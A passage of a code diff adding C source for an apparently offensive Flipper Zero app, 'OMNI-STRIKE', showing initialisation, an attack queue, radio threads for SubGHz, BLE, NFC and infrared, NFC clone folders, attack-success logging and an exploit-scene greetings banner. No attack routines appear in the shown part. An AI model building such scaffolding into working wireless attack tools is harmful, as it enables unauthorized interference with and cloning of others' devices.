+    if(!app->event_queue) return false;
+    
+    app->attack_queue = furi_message_queue_alloc(8, sizeof(Target));
+    if(!app->attack_queue) return false;
+    
+    app->scan_events = furi_event_flag_alloc();
+    if(!app->scan_events) return false;
+    
+    app->log_buffer = furi_stream_buffer_alloc(1024, 1);
+    if(!app->log_buffer) return false;
+
+    app->notification = furi_record_open(RECORD_NOTIFICATION);
+    app->gui = furi_record_open(RECORD_GUI);
+    app->bt = furi_record_open(RECORD_BT);
+    app->storage = furi_record_open(RECORD_STORAGE);
+    app->power = furi_record_open(RECORD_POWER);
+    app->nfc = furi_record_open(RECORD_NFC);
+
+    storage_common_mkdir(app->storage, EXT_PATH("omni_strike"));
+    storage_common_mkdir(app->storage, EXT_PATH("nfc/clones"));
+
+    app->log_stream = file_stream_alloc(app->storage);
+    if(!file_stream_open(app->log_stream, LOG_PATH, FSAM_WRITE, FSOM_OPEN_APPEND)) {
+        return false;
+    }
+    
+    app->analytics_stream = file_stream_alloc(app->storage);
+    if(!file_stream_open(app->analytics_stream, ANALYTICS_PATH, FSAM_WRITE, FSOM_OPEN_APPEND)) {
+        return false;
+    }
+
+    stream_write_format(app->analytics_stream, 
+                       "timestamp,protocol,attack,success,battery,power_mode,rssi,target_id,duration_ms\n");
+
+    app->view_port = view_port_alloc();
+    view_port_draw_callback_set(app->view_port, render_callback, app);
+    view_port_input_callback_set(app->view_port, 
+                                 (void*)furi_message_queue_put, 
+                                 app->event_queue);
+    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);
+
+    log_event(app, LogLevelInfo, "OMNI-STRIKE  by indoushka %s starting", VERSION);
+    log_event(app, LogLevelInfo, "Build: %s", BUILD_DATE);
+    
+    return true;
+}
+
+static void create_threads(OmniStrikeApp* app) {
+    app->subghz_thread = furi_thread_alloc();
+    furi_thread_set_name(app->subghz_thread, "SubGHz");
+    furi_thread_set_stack_size(app->subghz_thread, 2048);
+    furi_thread_set_context(app->subghz_thread, app);
+    furi_thread_set_callback(app->subghz_thread, subghz_thread);
+    furi_thread_start(app->subghz_thread);
+    
+    app->ble_thread = furi_thread_alloc();
+    furi_thread_set_name(app->ble_thread, "BLE");
+    furi_thread_set_stack_size(app->ble_thread, 2048);
+    furi_thread_set_context(app->ble_thread, app);
+    furi_thread_set_callback(app->ble_thread, ble_thread);
+    furi_thread_start(app->ble_thread);
+    
+    app->nfc_thread = furi_thread_alloc();
+    furi_thread_set_name(app->nfc_thread, "NFC");
+    furi_thread_set_stack_size(app->nfc_thread, 2048);
+    furi_thread_set_context(app->nfc_thread, app);
+    furi_thread_set_callback(app->nfc_thread, nfc_thread);
+    furi_thread_start(app->nfc_thread);
+    
+    app->infrared_thread = furi_thread_alloc();
+    furi_thread_set_name(app->infrared_thread, "IR");
+    furi_thread_set_stack_size(app->infrared_thread, 1024);
+    furi_thread_set_context(app->infrared_thread, app);
+    furi_thread_set_callback(app->infrared_thread, infrared_thread);
+    furi_thread_start(app->infrared_thread);
+    
+    app->power_thread = furi_thread_alloc();
+    furi_thread_set_name(app->power_thread, "Power");
+    furi_thread_set_stack_size(app->power_thread, 1024);
+    furi_thread_set_context(app->power_thread, app);
+    furi_thread_set_callback(app->power_thread, power_thread);
+    furi_thread_start(app->power_thread);
+    
+    app->watchdog_thread = furi_thread_alloc();
+    furi_thread_set_name(app->watchdog_thread, "Watchdog");
+    furi_thread_set_stack_size(app->watchdog_thread, 512);
+    furi_thread_set_context(app->watchdog_thread, app);
+    furi_thread_set_callback(app->watchdog_thread, watchdog_thread);
+    furi_thread_start(app->watchdog_thread);
+}
+
+int32_t omni_strike__v_main(void* p) {
+    UNUSED(p);
+
+    OmniStrikeApp* app = malloc(sizeof(OmniStrikeApp));
+    if(!app) return -1;
+    
+    memset(app, 0, sizeof(OmniStrikeApp));
+    app->selected_idx = -1;
+    app->state = SystemStateInit;
+    app->show_disclaimer = true;
+    app->power_mode = PowerModeMedium;
+
+    if(!init_system(app)) {
+        log_event(app, LogLevelError, "Init failed");
+        free(app);
+        return -1;
+    }
+
+    create_threads(app);
+    
+    app->state = SystemStateScan;
+    app->running = true;
+    app->stats.start_time = furi_get_tick();
+    
+    log_event(app, LogLevelSuccess, "System ready");
+
+    while(app->running) {
+        InputEvent event;
+        if(furi_message_queue_get(app->event_queue, &event, 100) == FuriStatusOk) {
+            handle_input(app, &event);
+        }
+
+        static uint32_t last_cleanup = 0;
+        uint32_t now = furi_get_tick();
+        if(now - last_cleanup > 5000) {
+            remove_old_targets(app);
+
+            app->stats.uptime = now - app->stats.start_time;
+            
+            last_cleanup = now;
+        }
+        
+        view_port_update(app->view_port);
+    }
+
+    app->state = SystemStateShutdown;
+    log_event(app, LogLevelInfo, "Shutting down...");
+
+    app->running = false;
+    
+    if(app->subghz_thread) furi_thread_join(app->subghz_thread);
+    if(app->ble_thread) furi_thread_join(app->ble_thread);
+    if(app->nfc_thread) furi_thread_join(app->nfc_thread);
+    if(app->infrared_thread) furi_thread_join(app->infrared_thread);
+    if(app->power_thread) furi_thread_join(app->power_thread);
+    if(app->watchdog_thread) furi_thread_join(app->watchdog_thread);
+
+    gui_remove_view_port(app->gui, app->view_port);
+    view_port_free(app->view_port);
+    
+    stream_free(app->log_stream);
+    stream_free(app->analytics_stream);
+    
+    furi_message_queue_free(app->event_queue);
+    furi_message_queue_free(app->attack_queue);
+    furi_mutex_free(app->mutex);
+    furi_event_flag_free(app->scan_events);
+    furi_stream_buffer_free(app->log_buffer);
+    
+    furi_record_close(RECORD_NFC);
+    furi_record_close(RECORD_POWER);
+    furi_record_close(RECORD_STORAGE);
+    furi_record_close(RECORD_BT);
+    furi_record_close(RECORD_GUI);
+    furi_record_close(RECORD_NOTIFICATION);
+    
+    log_event(app, LogLevelInfo, "Shutdown complete");
+    
+    free(app);
+    
+    return 0;
+}
+
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
